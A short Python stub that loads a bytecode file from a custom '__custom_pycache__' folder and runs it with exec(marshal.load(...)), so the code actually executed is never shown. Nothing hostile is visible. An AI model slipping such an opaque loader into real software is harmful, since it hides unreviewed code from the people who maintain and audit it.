
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'error_output_b12e522752b7441cb284fcb36e9392ea.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
